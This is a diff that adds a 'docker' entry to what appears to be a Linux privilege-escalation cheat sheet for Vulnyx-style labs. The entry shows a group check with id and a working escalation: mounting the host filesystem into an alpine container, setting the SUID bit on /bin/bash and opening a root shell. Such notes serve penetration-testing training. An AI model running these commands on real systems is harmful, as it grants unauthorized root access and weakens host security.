@@ -69,6 +69,24 @@ gaN4ZcqmaVXfzC0AAAALcm9vdEBzYXRvcmk=
 
 #### docker
 
+When a user is part of the `docker` **group**, they have the ability to **manage containers**.
+
+**Check Group**
+
+```
+low@vulnyx:~$ id
+uid=1000(low) gid=1000(low) groups=1000(low),109(docker)
+```
+
+** Abuse Group**
+
+```ruby
+low@vulnyx:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# chmod 4755 /bin/bash
+# exit
+low@vulnyx:~$ /bin/bash -pi
+```
+
 #### lxd
 
 #### fail2ban
